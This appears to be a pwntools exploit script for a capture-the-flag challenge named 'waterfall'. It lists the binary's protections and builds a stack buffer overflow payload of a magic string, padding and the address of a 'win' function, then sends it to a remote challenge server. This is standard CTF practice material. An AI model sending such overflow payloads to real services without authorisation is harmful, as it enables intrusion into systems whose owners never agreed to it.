# Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No
from pwn import *
DEBUG = 0
if DEBUG == 1:   
    context.log_level = "debug"

biname = "./waterfall"    
context.binary = exe = ELF(biname)

winfun = exe.symbols['win']
print(winfun)

data = 32
worthyness = b"I am worthy\x00"
payload = worthyness + b"A"*(32-len(worthyness)) + b"B"*8 + p64(winfun)



#p = process(biname)
p = remote("cyberchallenge.diag.uniroma1.it", "5269")
p.recvuntil(b"for this waterfall yields its treasures only to the determined and resolute.")
p.send(payload)
while True:
    print(p.recvline())